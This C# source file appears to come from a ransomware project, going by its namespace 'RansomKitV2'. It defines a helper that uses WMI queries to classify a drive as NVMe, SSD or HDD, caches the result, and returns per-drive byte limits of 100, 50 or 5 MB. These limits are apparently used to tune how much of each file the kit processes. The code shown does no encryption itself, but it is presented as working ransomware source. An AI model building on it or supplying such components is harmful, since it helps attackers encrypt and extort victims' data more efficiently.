using System;
using System.Collections.Concurrent;
using System.IO;
using System.Management;

namespace RansomKitV2
{
    public enum DriveSpeed { NVMe, SSD, HDD, Unknown }

    public static class DriveHelper
    {
        private static readonly ConcurrentDictionary<string, DriveSpeed> _cache = new();

        public static DriveSpeed GetDriveType(string path)
        {
            string root = Path.GetPathRoot(path)?.TrimEnd('\\') + "\\";
            if (string.IsNullOrEmpty(root)) return DriveSpeed.Unknown;

            // Return cached result instantly
            if (_cache.TryGetValue(root, out var cached)) return cached;

            var type = DetermineDriveType(root);
            _cache[root] = type;
            return type;
        }

        private static DriveSpeed DetermineDriveType(string root)
        {
            try
            {
                // We only query for the specific drive letter now
                using var searcher = new ManagementObjectSearcher(
                    $"ASSOCIATORS OF {{Win32_LogicalDisk.DeviceID='{root.TrimEnd('\\')}'}} WHERE AssocClass=Win32_LogicalDiskToPartition");

                foreach (ManagementObject part in searcher.Get())
                {
                    using var diskSearcher = new ManagementObjectSearcher(
                        $"ASSOCIATORS OF {{Win32_DiskPartition.DeviceID='{part["DeviceID"]}'}} WHERE AssocClass=Win32_DiskDriveToDiskPartition");

                    foreach (ManagementObject disk in diskSearcher.Get())
                    {
                        string model = disk["Model"]?.ToString() ?? "";
                        string mediaType = disk["MediaType"]?.ToString() ?? "";

                        if (model.Contains("NVMe", StringComparison.OrdinalIgnoreCase)) return DriveSpeed.NVMe;
                        if (model.Contains("SSD", StringComparison.OrdinalIgnoreCase)) return DriveSpeed.SSD;
                        if (mediaType.Contains("Fixed hard disk", StringComparison.OrdinalIgnoreCase)) return DriveSpeed.HDD;
                    }
                }
            }
            catch { }

            return DriveSpeed.HDD; // Default safely to HDD (slowest/safest limits)
        }

        public static long GetMaxSizeBytes(string path)
        {
            var type = GetDriveType(path);
            return type switch
            {
                DriveSpeed.NVMe => 100 * 1024 * 1024, // 100 MB
                DriveSpeed.SSD => 50 * 1024 * 1024,   // 50 MB
                DriveSpeed.HDD => 5 * 1024 * 1024,    // 5 MB
                _ => 5 * 1024 * 1024
            };
        }
    }
}